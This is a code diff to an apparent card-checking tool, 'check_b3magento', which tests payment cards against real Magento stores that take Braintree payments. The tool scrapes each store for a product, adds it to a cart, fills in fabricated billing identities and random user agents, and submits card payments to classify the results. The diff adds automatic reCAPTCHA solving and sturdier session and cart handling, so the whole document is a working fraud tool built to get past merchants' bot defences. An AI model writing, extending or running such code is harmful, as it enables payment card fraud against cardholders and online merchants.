@@ -36,6 +36,7 @@ from .utils import (
     get_country_for_domain,
     random_ua,
     session_id,
+    solve_recaptcha,
 )
 
 
@@ -154,30 +155,28 @@ def _warm_session(session: requests.Session, domain: str, ua: str) -> tuple:
     Also probes for the active REST store-view prefix.
     Returns (form_key, rest_prefix) e.g. ('abc123', '/rest/default/V1').
     """
-    form_key   = ""
+    form_key    = ""
     rest_prefix = "/rest/V1"
-    for path in ("/", "/checkout/"):
-        try:
-            r = session.get(
-                f"https://{domain}{path}",
-                headers={"User-Agent": ua, "Accept": "text/html,*/*",
-                         "Accept-Language": "en-US,en;q=0.9"},
-                timeout=REQUEST_TIMEOUT,
-            )
-            html = r.text
-            if not form_key:
-                m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', html)
-                if m:
-                    form_key = m.group(1)
-                if not form_key:
-                    form_key = session.cookies.get("form_key", "")
-            # Detect store-view from script URLs, e.g. /rest/default/V1 or /rest/en_US/V1
-            if not rest_prefix or rest_prefix == "/rest/V1":
-                m = re.search(r'/rest/([a-z]{2}(?:_[A-Z]{2})?|default)/V1/', html)
-                if m:
-                    rest_prefix = f"/rest/{m.group(1)}/V1"
-        except Exception:
-            pass
+    # Only visit the homepage — visiting /checkout/ before ATC corrupts session state
+    try:
+        r = session.get(
+            f"https://{domain}/",
+            headers={"User-Agent": ua, "Accept": "text/html,*/*",
+                     "Accept-Language": "en-US,en;q=0.9"},
+            timeout=REQUEST_TIMEOUT,
+        )
+        html = r.text
+        m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', html)
+        if m:
+            form_key = m.group(1)
+        if not form_key:
+            form_key = session.cookies.get("form_key", "")
+        # Detect store-view from script URLs, e.g. /rest/default/V1 or /rest/en_US/V1
+        m = re.search(r'/rest/([a-z]{2}(?:_[A-Z]{2})?|default)/V1/', html)
+        if m:
+            rest_prefix = f"/rest/{m.group(1)}/V1"
+    except Exception:
+        pass
     return form_key, rest_prefix
 
 
@@ -277,23 +276,183 @@ def _discover_product(session: requests.Session, domain: str, ua: str):
     except Exception:
         pass
 
-    # Fallback: HTML scraping for Magento 2 ATC data-post attributes
-    for path in ("/", "/catalog/category/view/"):
+    # Fallback: HTML scraping for Magento 2 product IDs
+    product_ids: list = []
+    for path in ("/", "/catalogsearch/result/?q=a"):
         try:
             r = session.get(f"https://{domain}{path}", headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
             html = r.text
-            # data-post JSON: {"action":"...","data":{"product":"ID",...}}
-            m = re.search(r'"product"\s*:\s*"?(\d+)"?', html)
-            if m:
-                return m.group(1), ""
-            # data-product-id or data-product_id
-            m = re.search(r'data-product[-_]id=["\'](\d+)["\']', html)
-            if m:
-                return m.group(1), ""
+            ids = re.findall(r'"product"\s*:\s*"?(\d+)"?', html)
+            product_ids.extend(ids)
+            ids2 = re.findall(r'data-product[-_]id=["\'](\d+)["\']', html)
+            product_ids.extend(ids2)
+            ids3 = re.findall(r'"product_id"\s*:\s*(\d+)', html)
+            product_ids.extend(ids3)
+            if product_ids:
+                break
         except Exception:
             continue
 
-    return None
+    if not product_ids:
+        # Sitemap strategy: get the first product URL and visit it
+        try:
+            rs = session.get(f"https://{domain}/sitemap.xml",
+                             headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
+            if rs.status_code == 200:
+                prod_urls = re.findall(r'<loc>(https?://[^<]+\.html)</loc>', rs.text)
+                if prod_urls:
+                    rp = session.get(prod_urls[0], headers={"User-Agent": ua},
+                                     timeout=REQUEST_TIMEOUT, allow_redirects=True)
+                    if rp.status_code == 200:
+                        full = rp.text
+                        sku_m = re.search(r'data-product-sku=["\']([^"\']{1,120})["\']', full)
+                        pid_m = (
+                            re.search(r'name=["\']product["\'][^>]*value=["\'](\d+)["\']', full)
+                            or re.search(r'value=["\'](\d+)["\'][^>]*name=["\']product["\']', full)
+                            or re.search(r'data-product[-_]id=["\'](\d+)["\']', full)
+                            or re.search(r'/product/(\d+)/', full)
+                            or re.search(r'"product_id"\s*:\s*(\d+)', full)
+                        )
+                        if pid_m:
+                            return pid_m.group(1), (sku_m.group(1) if sku_m else "")
+        except Exception:
+            pass
+        return None
+
+    # Visit the product page to get the actual SKU
+    pid = product_ids[0]
+    try:
+        r = session.get(
+            f"https://{domain}/catalog/product/view/id/{pid}/",
+            headers={"User-Agent": ua},
+            timeout=REQUEST_TIMEOUT,
+        )
+        if r.status_code == 200:
+            sku_m = re.search(r'data-product-sku=["\']([^"\']{1,120})["\']', r.text)
+            if sku_m:
+                return pid, sku_m.group(1)
+    except Exception:
+        pass
+
+    return pid, ""
+
+
+# -- Non-FPC form_key fetcher ------------------------------------------------
+
+def _get_form_key(session: requests.Session, domain: str, ua: str) -> str:
+    """Get a valid (non-FPC-cached) form_key by visiting a non-cached page."""
+    for path in ("/customer/account/create/", "/contact/", "/customer/account/login/"):
+        try:
+            r = session.get(
+                f"https://{domain}{path}",
+                headers={"User-Agent": ua},
+                timeout=REQUEST_TIMEOUT,
+            )
+            if r.status_code == 200:
+                m = re.search(r'name=["\']form_key["\'][^>]*value=["\']([A-Za-z0-9]{8,})["\']', r.text)
+                if m:
+                    return m.group(1)
+                m2 = re.search(r'value=["\']([A-Za-z0-9]{8,})["\'][^>]*name=["\']form_key["\']', r.text)
+                if m2:
+                    return m2.group(1)
+        except Exception:
+            continue
+    return ""
+
+
+# -- Session-based add-to-cart -----------------------------------------------
+
+def _session_atc(session: requests.Session, domain: str, ua: str,
+                 form_key: str, product_id: str) -> bool:
+    """POST form-based add-to-cart linking the product to the PHP session.
+    Returns True if the mage-messages cookie indicates success."""
+    try:
+        session.post(
+            f"https://{domain}/checkout/cart/add/",
+            data={"product": product_id, "qty": "1", "form_key": form_key},
+            headers={
+                "User-Agent":   ua,
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer":      f"https://{domain}/",
+                "Origin":       f"https://{domain}",
+            },
+            timeout=REQUEST_TIMEOUT,
+            allow_redirects=True,
+        )
+        msgs = session.cookies.get("mage-messages", "")
+        return "success" in msgs.lower() or "added" in msgs.lower()
+    except Exception:
+        return False
+
+
+# -- Checkout page config parser ---------------------------------------------
+
+def _parse_checkout_config(session: requests.Session, domain: str, ua: str) -> dict:
+    """Visit /checkout/ and return parsed window.checkoutConfig dict (or {}).
+    Also sets result['recaptcha_sitekey'] if a reCAPTCHA sitekey is found.
+    """
+    try:
+        r = session.get(
+            f"https://{domain}/checkout/",
+            headers={"User-Agent": ua, "Accept": "text/html"},
+            timeout=REQUEST_TIMEOUT,
+        )
+        if r.status_code != 200:
+            return {}
+        html = r.text
+        m = re.search(r'window\.checkoutConfig\s*=\s*(\{)', html)
+        if not m:
+            return {}
+        raw = html[m.start(1):]
+        # Try full JSON decode first (handles trailing JS after the object)
+        decoder = json.JSONDecoder()
+        result: dict = {}
+        try:
+            data, _ = decoder.raw_decode(raw)
+            if isinstance(data, dict):
+                result = data
+        except Exception:
+            # Regex fallback: extract the three fields we need
+            ct_m  = re.search(r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"', raw[:300000])
+            mid_m = re.search(r'"masked_id"\s*:\s*"([A-Za-z0-9]{32,})"', raw[:300000])
+            eid_m = re.search(r'"entity_id"\s*:\s*"([A-Za-z0-9]{15,})"', raw[:300000])
+            gt_m  = re.search(r'"grand_total"\s*:\s*([0-9]+\.?[0-9]*)', raw[:300000])
+            if ct_m:
+                result = {"payment": {"braintree": {"clientToken": ct_m.group(1)}}}
+            if mid_m:
+                result.setdefault("quoteData", {})["masked_id"] = mid_m.group(1)
+            elif eid_m:
+                result.setdefault("quoteData", {})["entity_id"] = eid_m.group(1)
+            if gt_m:
+                result.setdefault("quoteData", {})["grand_total"] = float(gt_m.group(1))
+
+        # Extract reCAPTCHA sitekey if present (Magento 2 reCAPTCHA module)
+        sitekey = ""
+        # 1. From checkoutConfig JSON (recaptchaData or nested siteKey)
+        recap_data = result.get("recaptchaData") or {}
+        for val in recap_data.values():
+            if isinstance(val, dict) and val.get("siteKey"):
+                sitekey = val["siteKey"]
+                break
+        # 2. From HTML attributes: data-sitekey or recaptcha script params
+        if not sitekey:
+            sk_m = (
+                re.search(r'data-sitekey=["\']([A-Za-z0-9_-]{20,})["\']', html)
+                or re.search(r'["\']siteKey["\']\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']', html)
+                or re.search(r'recaptcha[^>]*key[^>]*=["\']([A-Za-z0-9_-]{20,})["\']', html, re.I)
+            )
+            if sk_m:
+                sitekey = sk_m.group(1)
+        if sitekey:
+            result["recaptcha_sitekey"] = sitekey
+            # Detect v3 (score-based) vs v2
+            if re.search(r'recaptcha[_-]?v3|ReCaptchaV3|recaptchaVersion.*v3', html, re.I):
+                result["recaptcha_version"] = "v3"
+            else:
+                result["recaptcha_version"] = "v2"
+        return result
+    except Exception:
+        return {}
 
 
 # -- Braintree clientToken fetcher -------------------------------------------
@@ -371,77 +530,79 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
         "Referer":           base_url + "/checkout/cart/",
     }
 
-    # 1. Create guest cart (multi-prefix fallback)
-    masked_id, working_prefix = _create_guest_cart(session, domain, ua, rest_prefix, json_hdrs)
-    if not masked_id:
-        return {"status": "unknown", "message": "Cart create failed (all REST paths failed)", "amount": "", "card": card_str}
-    if working_prefix == "AUTH_REQUIRED":
-        return {"status": "unknown", "message": "Cart create failed (store requires auth)", "amount": "", "card": card_str}
-    # Use the prefix that worked for subsequent cart API calls
-    rest_v1 = f"https://{domain}{working_prefix}"
-
-    # 2. Discover product
+    # 1. Discover product
     product = _discover_product(session, domain, ua)
     if not product:
         return {"status": "unknown", "message": "Could not find product on store", "amount": "", "card": card_str}
     product_id, product_sku = product
 
-    # 3. Add to cart
-    # — REST (SKU-based) when we have a real SKU; form-based fallback when SKU is empty
-    atc_ok = False
-    if product_sku:
-        try:
-            r = session.post(
-                f"{rest_v1}/guest-carts/{masked_id}/items",
-                json={"cartItem": {"quote_id": masked_id, "sku": product_sku, "qty": 1}},
-                headers=json_hdrs,
-                timeout=REQUEST_TIMEOUT,
-            )
-            if r.status_code in (200, 201):
-                atc_ok = True
-        except Exception as exc:
-            return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}
+    # 2. Ensure we have a valid (non-FPC-cached) form_key for this session
+    if not form_key:
+        form_key = _get_form_key(session, domain, ua)
 
-    if not atc_ok:
-        # Form-based ATC — works with product_id, no SKU needed
-        try:
-            form_data = {"product": product_id, "qty": "1", "form_key": form_key}
-            r = session.post(
-                f"{base_url}/checkout/cart/add/",
-                data=form_data,
-                headers={
-                    "User-Agent":       ua,
-                    "Content-Type":     "application/x-www-form-urlencoded",
-                    "Referer":          f"{base_url}/",
-                    "Origin":           base_url,
-                },
-                timeout=REQUEST_TIMEOUT,
-                allow_redirects=True,
-            )
-            # Magento redirects to cart on success; response contains cart data
-            if r.status_code in (200, 302) and ("checkout/cart" in str(r.url) or "cart" in r.text.lower()):
-                atc_ok = True
-            # Fallback: check if cart now has items via REST
-            if not atc_ok:
-                ck = session.get(
-                    f"{rest_v1}/guest-carts/{masked_id}",
-                    headers={"User-Agent": ua, "Accept": "application/json"},
+    # 3. Add to cart + get checkout configuration
+    masked_id        = ""
+    working_prefix   = rest_prefix
+    client_token_raw = ""
+    amount           = ""
+    cc_data: dict    = {}
+
+    # 3a. Primary path: form-based ATC links cart to session → checkout page
+    #     gives us the clientToken AND the session cart's masked_id.
+    if form_key:
+        if _session_atc(session, domain, ua, form_key, product_id):
+            cc_data          = _parse_checkout_config(session, domain, ua)
+            bt_cfg           = (cc_data.get("payment") or {}).get("braintree") or {}
+            client_token_raw = bt_cfg.get("clientToken", "")
+            qd               = cc_data.get("quoteData") or {}
+            # Prefer masked_id (32-char hex) over entity_id (small integer)
+            masked_id        = qd.get("masked_id") or qd.get("entity_id", "")
+            grand            = qd.get("grand_total")
+            if grand:
+                amount = f"${grand}"
+
+    # 3b. Fallback path: REST guest-cart + REST ATC (uses SKU)
+    if not masked_id:
+        masked_id_rest, working_prefix = _create_guest_cart(session, domain, ua, rest_prefix, json_hdrs)
+        if not masked_id_rest:
+            return {"status": "unknown", "message": "Cart create failed (all REST paths failed)", "amount": "", "card": card_str}
+        if working_prefix == "AUTH_REQUIRED":
+            return {"status": "unknown", "message": "Cart create failed (store requires auth)", "amount": "", "card": card_str}
+        rest_v1_tmp = f"https://{domain}{working_prefix}"
+        if product_sku:
+            try:
+                r = session.post(
+                    f"{rest_v1_tmp}/guest-carts/{masked_id_rest}/items",
+                    json={"cartItem": {"quote_id": masked_id_rest, "sku": product_sku, "qty": 1}},
+                    headers=json_hdrs,
                     timeout=REQUEST_TIMEOUT,
                 )
-                if ck.status_code == 200:
-                    cart_data = ck.json()
-                    if isinstance(cart_data, dict) and cart_data.get("items_count", 0) > 0:
-                        atc_ok = True
-        except Exception as exc:
-            return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}
+                if r.status_code in (200, 201):
+                    masked_id = masked_id_rest
+            except Exception as exc:
+                return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}
 
-    if not atc_ok:
+    if not masked_id:
         return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}
 
-    # 4. Fetch Braintree clientToken
-    client_token_raw = _get_client_token(session, domain, ua)
+    rest_v1 = f"https://{domain}{working_prefix}"
+
+    # 4. Fetch Braintree clientToken (skip if already obtained from checkout config)
+    if not client_token_raw:
+        client_token_raw = _get_client_token(session, domain, ua)
     if not client_token_raw:
         return {"status": "unknown", "message": "Not a Braintree store (no clientToken)", "amount": "", "card": card_str}
+
+    # 4b. Solve reCAPTCHA if present on checkout
+    recaptcha_token = ""
+    rc_sitekey = cc_data.get("recaptcha_sitekey", "")
+    if rc_sitekey:
+        rc_version = cc_data.get("recaptcha_version", "v2")
+        recaptcha_token = solve_recaptcha(
+            sitekey=rc_sitekey,
+            pageurl=f"https://{domain}/checkout/",
+            version=rc_version,
+        )
 
     try:
         pad            = "=" * ((4 - len(client_token_raw) % 4) % 4)
@@ -451,13 +612,20 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     except Exception as exc:
         return {"status": "unknown", "message": f"clientToken decode: {exc}", "amount": "", "card": card_str}
 
-    # 5. Build billing identity
+    # 5. Build billing identity (locale-aware)
     ident      = get_billing_identity(domain)
     country    = ident.get("country") or get_country_for_domain(domain) or "US"
     state      = ident.get("state", "")
     state_full = ident.get("state_full", state)
-    region_id  = ident.get("region_id", "") or (_US_REGION_IDS.get(state, "") if country == "US" else "")
     full_name  = f"{ident['fname']} {ident['lname']}"
+
+    # region_id: US stores need an integer region ID; non-US stores need 0
+    if country == "US":
+        region_id = int(ident.get("region_id") or _US_REGION_IDS.get(state, 0) or 0)
+    else:
+        region_id = 0
+        state_full = ""  # Non-US Magento stores don't use region names in address
+        state      = ""
 
     addr = {
         "street":     [ident["street"]],
@@ -490,8 +658,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     except Exception:
         pass
 
-    # 7. Set shipping -> get order total
-    amount = ""
+    # 7. Set shipping (always required for physical goods) + get order total
     try:
         r = session.post(
             f"{rest_v1}/guest-carts/{masked_id}/shipping-information",
@@ -640,8 +807,8 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     billing_addr = {
         "countryId":         country,
         "regionId":          region_id,
-        "regionCode":        state,
-        "region":            state_full,
+        "regionCode":        state if country == "US" else "",
+        "region":            state_full if country == "US" else "",
         "street":            [ident["street"]],
         "company":           full_name,
         "telephone":         ident["phone"],
@@ -655,6 +822,10 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
         "device_session_id": secrets.token_hex(16),
         "fraud_merchant_id": "null",
     })
+
+    pay_hdrs = dict(json_hdrs)
+    if recaptcha_token:
+        pay_hdrs["X-ReCaptcha"] = recaptcha_token
 
     try:
         r = session.post(
@@ -673,7 +844,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
                 },
                 "email": ident["email"],
             },
-            headers=json_hdrs,
+            headers=pay_hdrs,
             timeout=REQUEST_TIMEOUT,
         )
         return _classify(r.text, r.status_code, amount, card_str)
